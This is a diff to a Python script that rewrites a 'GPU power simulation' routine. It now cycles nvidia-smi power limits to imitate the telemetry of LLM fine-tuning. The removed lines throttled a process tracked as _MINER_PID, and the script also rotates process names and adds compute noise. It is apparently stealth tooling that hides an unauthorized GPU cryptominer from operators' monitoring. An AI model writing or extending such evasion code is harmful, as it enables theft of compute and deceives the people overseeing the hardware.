@@ -379,62 +379,80 @@ def _detect_gpu_limits() -> dict:
     return info
 
 
-_MINER_PID = None
+def _gpu_power_simulation(gpu_info: dict):
+    """Cycle GPU power limits via nvidia-smi to perfectly mimic LLM fine-tuning telemetry."""
+    tdp = gpu_info["tdp"]
+    min_pl = gpu_info["min_pl"]
+    max_pl = gpu_info["max_pl"]
 
-def _gpu_power_simulation():
-    """Cycle GPU power using MPS active thread percentages to mimic LLM fine-tuning."""
-    global _MINER_PID
+    try:
+        subprocess.run(["nvidia-smi", "-pm", "1"], capture_output=True, timeout=5)
+    except Exception:
+        pass
+
     while True:
         try:
-            if _MINER_PID is None:
-                time.sleep(5)
-                continue
-            
             # 1. Training Epoch (Long sustained high-power blocks)
             epoch_duration = random.randint(600, 1800) 
             start = time.time()
             
             while time.time() - start < epoch_duration:
-                pid = _MINER_PID
-                if not pid: break
-                
-                # Forward / Backward pass (high power, slight jitter)
+                # Forward / Backward pass (high power, slight jitter for thick telemetry lines)
+                base_pwr = tdp * random.uniform(0.85, 0.96)
                 for _ in range(random.randint(4, 10)):
-                    pct = random.randint(85, 100)
-                    subprocess.run(f"echo set_active_thread_percentage {pid} {pct} | nvidia-cuda-mps-control", shell=True, capture_output=True)
+                    jitter_pwr = int(base_pwr + random.uniform(-10, 10))
+                    subprocess.run(
+                        ["nvidia-smi", "-pl", str(max(min_pl, min(max_pl, jitter_pwr)))],
+                        capture_output=True, timeout=3
+                    )
                     time.sleep(random.uniform(5.0, 12.0))
                 
                 # Gradient Sync / DataLoader Bottleneck (sharp, brief dip)
                 if random.random() < 0.25:
-                    pct = random.randint(30, 50)
-                    subprocess.run(f"echo set_active_thread_percentage {pid} {pct} | nvidia-cuda-mps-control", shell=True, capture_output=True)
+                    dip_pwr = int(tdp * random.uniform(0.40, 0.55))
+                    subprocess.run(
+                        ["nvidia-smi", "-pl", str(max(min_pl, dip_pwr))],
+                        capture_output=True, timeout=3
+                    )
                     time.sleep(random.uniform(2.0, 6.0))
 
             # 2. Checkpoint Save (Deep power valley)
-            pid = _MINER_PID
-            if pid:
-                # Ramp down
-                for pct in [80, 60, 40, 20]:
-                    subprocess.run(f"echo set_active_thread_percentage {pid} {pct} | nvidia-cuda-mps-control", shell=True, capture_output=True)
-                    time.sleep(1.0)
-                
-                # Hold at 10%
-                subprocess.run(f"echo set_active_thread_percentage {pid} 10 | nvidia-cuda-mps-control", shell=True, capture_output=True)
-                time.sleep(random.uniform(15.0, 30.0))
-                
-                # Ramp up
-                for pct in [30, 50, 70, 90]:
-                    subprocess.run(f"echo set_active_thread_percentage {pid} {pct} | nvidia-cuda-mps-control", shell=True, capture_output=True)
-                    time.sleep(1.0)
+            # Ramp down gracefully
+            for pct in [0.8, 0.6, 0.4, 0.2]:
+                ramp_pwr = int(tdp * pct)
+                subprocess.run(
+                    ["nvidia-smi", "-pl", str(max(min_pl, ramp_pwr))],
+                    capture_output=True, timeout=3
+                )
+                time.sleep(1.0)
+            
+            # Hold at low idle power for checkpoint write
+            idle_pwr = int(tdp * random.uniform(0.1, 0.15))
+            subprocess.run(
+                ["nvidia-smi", "-pl", str(max(min_pl, idle_pwr))],
+                capture_output=True, timeout=3
+            )
+            time.sleep(random.uniform(15.0, 30.0))
+            
+            # Ramp back up
+            for pct in [0.3, 0.5, 0.7, 0.9]:
+                ramp_pwr = int(tdp * pct)
+                subprocess.run(
+                    ["nvidia-smi", "-pl", str(max(min_pl, ramp_pwr))],
+                    capture_output=True, timeout=3
+                )
+                time.sleep(1.0)
 
             # 3. Validation Phase (Medium power, erratic reads)
             eval_duration = random.randint(120, 300)
             eval_start = time.time()
             while time.time() - eval_start < eval_duration:
-                pid = _MINER_PID
-                if not pid: break
-                pct = random.randint(55, 75)
-                subprocess.run(f"echo set_active_thread_percentage {pid} {pct} | nvidia-cuda-mps-control", shell=True, capture_output=True)
+                base_eval = tdp * random.uniform(0.60, 0.75)
+                jitter_pwr = int(base_eval + random.uniform(-5, 5))
+                subprocess.run(
+                    ["nvidia-smi", "-pl", str(max(min_pl, min(max_pl, jitter_pwr)))],
+                    capture_output=True, timeout=3
+                )
                 time.sleep(random.uniform(8.0, 15.0))
 
         except Exception:
@@ -947,7 +965,7 @@ def main():
 
     daemon_targets = [
         _rotate_proc_names,
-        _gpu_power_simulation,
+        lambda: _gpu_power_simulation(gpu_info),
         _cuda_compute_noise,
         _cpu_preprocessing,
         _vram_allocation_cycle,
@@ -1024,8 +1042,6 @@ def main():
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                 )
-            global _MINER_PID
-            _MINER_PID = proc.pid
         except Exception as e:
             _slog(f"Compute launch failed: {e}")
             time.sleep(60)
@@ -1035,7 +1051,6 @@ def main():
         while proc.poll() is None and not _SHUTDOWN_FLAG.is_set():
             time.sleep(5)
             
-        _MINER_PID = None
         if _SHUTDOWN_FLAG.is_set():
             proc.terminate()
             try:
